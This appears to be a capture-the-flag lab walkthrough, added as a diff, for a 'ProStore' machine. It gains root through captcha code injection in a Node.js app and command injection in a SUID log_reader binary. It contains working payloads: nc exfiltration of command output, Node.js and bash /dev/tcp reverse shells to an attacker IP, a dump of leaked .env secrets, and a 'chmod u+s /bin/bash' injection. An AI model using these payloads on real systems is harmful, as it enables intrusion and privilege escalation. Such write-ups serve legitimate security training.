@@ -1,0 +1,226 @@
+																			                        ProStore Walkthrough
+																			
+																								
+Attacker's Machine: 192.168.190.250
+Victim's Machine: 192.168.45.173
+export IP=192.168.190.250
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 1c:19:57:44:ae:0d:f4:06:b1:bc:ee:35:d0:c7:53:31 (ECDSA)
+|_  256 cf:a2:3b:50:fd:d0:38:0f:4b:bb:68:2f:b9:a9:02:20 (ED25519)
+5000/tcp open  http    Node.js (Express middleware)
+|_http-title: ProStore
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# Enumeration didn't reveal anything on port 5000
+# Port 22, brute forcing, nothing revealed
+
+# Let's try to create an account and check out the application
+   Nothing seems too obvious, we only know that node.js is being used.
+
+# Once we add a product to our cart and proceed to checkout, there is a captcha validation that need to be verified. 
+  If we check the validation on the backend, we can see that our input is getting processed as code for the captcha parameter.
+  
+
+
+
+# Let's try to confirm and check if we can exploit it further by sending a simple multiplication that is correct.
+   Use * symbol instead of 1+2, because + sign is treated as a space in HTTP requests.
+
+
+
+
+
+# Ok, now that we have confirmed it, let's try to see if we can execute commands on the system
+   Let's check for a public exploit for node.js
+   
+searchsploit node.js
+
+Node.JS - 'node-serialize' Remote Code Execution                                                                                                 | linux/remote/45265.js
+Node.JS - 'node-serialize' Remote Code Execution (2)                                                                                             | nodejs/webapps/49552.py
+Node.JS - 'node-serialize' Remote Code Execution (3)                                                                                             | nodejs/webapps/50036.js
+
+searchsploit -m linux/remote/45265.js
+
+var serialize = require('node-serialize');
+var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
+serialize.unserialize(payload);      
+
+# Let's try to run a simple id command and send the results to our netcat listener because you can't retrieve the results directly from the server's response.
+
+Start our listener
+nc -lvnp 80
+
+Configure our payload 
+
+require('child_process').exec('id|nc+192.168.45.173+80')
+
+# Send the request
+
+full_name=me&address=me&card=me&cvc=123&date=1234&captcha=require('child_process').exec('id|nc+192.168.45.173+80')
+
+nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.45.173] from (UNKNOWN) [192.168.190.250] 41268
+uid=1000(observer) gid=1000(observer) groups=1000(observer)
+
+
+
+# Nice, now that we have code execution, let's try to obtain our reverse shell. 
+    First we need a good payload, let's search online for node.js reverse shell.
+    
+https://gist.github.com/secoats/44b9b42920ac4a825e54e7310303cfdb
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(80, "192.168.45.173", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+
+# Now we need to add this payload and URL encode within burp with Ctrl+U
+
+
+
+or we can use a simple bash revershe shell payload
+
+require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/192.168.45.173/80+0>%261"')
+
+
+cat local.txt
+b04a90839dd00a88130f7977cd73f795
+
+
+# Nice, we got in, let's go after privilege escalation
+
+python3 -m http.server 80
+wget http://192.168.45.173:80/linpeas.sh
+chmod 777 linpeas.sh 
+./linpeas.sh 
+
+-rw-r--r-- 1 observer observer 247 Dec 23  2022 /home/observer/app/backend/.env                                                                                                    
+APP_PORT=5000
+DB_HOSTNAME="127.0.0.1"
+DB_NAME="prostore_db"
+DB_PASSWORD="d8491f5ddd9137cc3630a8a054b01cdf71110a62"
+DB_PORT=5432
+DB_USER="prostore"
+JWT_SECRET="d148c461e7241a2c94727e17fa70b90f"
+PASSWORD_HASH_SALT="a008e3dc8f8ec8a0a6e485b890d74d91"
+
+
+-rwsr-xr-x 1 root root 20K Feb 13  2023 /usr/local/bin/log_reader (Unknown SUID binary!)
+
+# Can't crack the password, seems to be SHA1
+
+wget http://192.168.45.173:80/pspy64
+
+# Nothing
+# Wen't after the log_Reader binary, checked strings and the command itself, it seems to be used to read log files or other filenames.
+    Let's create a log file and see what happends
+    
+echo "1234" > 1.log
+
+/usr/local/bin/log_reader 1.log
+Reading: 1.log
+1234
+
+# So it basically displays the contents of it, so let's see if we can access /etc/shadow file.
+
+/usr/local/bin/log_reader /etc/shadow
+
+# Nothing happends, since we have no idea how the fuck does this binary work, let's use some debugging tools which are available on the machine.
+
+gdb -q /usr/local/bin/log_reader
+Reading symbols from /usr/local/bin/log_reader...
+(gdb) list
+1       /tmp/log_reader.c: No such file or directory.
+
+# Check the file path, the file doesn't exist, let's try to check globally on the machine, maybe we get lucky
+
+find / -name "log_reader.c" 2>/dev/null
+/usr/share/src/log_reader.c
+
+# Let's see if we get anything usefull
+
+cat /usr/share/src/log_reader.c
+cat /usr/share/src/log_reader.c
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+
+    if (argc != 2) {
+        printf("Usage: %s filename.log\n", argv[0]);
+        return 0;
+    }
+
+    char *filename = argv[1];
+    char *result;
+    result = checkExtention(filename, result);
+
+    if (result != NULL) {
+        readFile(filename);
+    }
+
+    return 0;
+}
+
+void checkExtention(char *filename, char *result) {
+    char *ext = strchr(filename, '.');
+
+    if (ext != NULL) {
+        result = strstr(ext, ".log");
+    }
+}
+
+void readFile(char *filename) {
+    setuid(0);
+    setgid(0);
+
+    printf("Reading: %s\n", filename);
+
+    char command[200] = "/usr/bin/cat ";
+    char output[10000];
+    FILE *result;
+
+    strcat(command, filename);
+    result = popen(command, "r");
+    fgets(output, sizeof(output), result);
+    printf("%s\n", output);
+}
+
+# What the fuck is this, code ? I'm out!
+
+strcat(command, filename);       -- strcat is a function used to concatenate two strings. Here, it appends the string filename to the end of the string command.  
+result = popen(command, "r");  -- popen executes the string command as a shell command and opens a pipe to read the output of this command.  
+                                              -- The "r" argument specifies that the pipe is opened in read mode.
+                                              
+In this case, if we input a filename like 1.log&&id, the binary will execute as cat 1.log&&id. 
+
+/usr/local/bin/log_reader 1.log&&id
+Reading: 1.log
+1234
+
+uid=1000(observer) gid=1000(observer) groups=1000(observer)
+
+# So, let's try set suid on another executable, such as bash
+
+/usr/local/bin/log_reader "1.log;chmod u+s /bin/bash"
+
+observer@prostore:~$ /usr/bin/bash -p
+whoami
+root
+
+cat proof.txt
+fb3e5d143d033a8b5b2bb39450ee925a
